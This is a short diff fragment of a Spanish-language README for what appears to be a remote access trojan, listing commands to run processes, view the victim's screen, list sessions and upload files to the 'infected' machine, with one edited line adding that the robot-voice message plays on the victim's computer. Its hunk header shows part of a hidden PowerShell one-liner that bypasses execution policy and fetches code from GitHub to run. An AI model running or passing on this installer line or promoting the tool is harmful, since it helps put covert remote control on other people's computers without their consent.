@@ -27,7 +27,7 @@ powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.c
 - run: corre un proceso
 - screen: visualiza la pantalla de la victima
 - sessions: obtiene las sesiones abiertas en el sistema
-- speak: di un mensaje con voz de robot
+- speak: di un mensaje con voz de robot en ele quipo de la víctima
 - upload: sube ficheros al infectado
 
 # Ideas
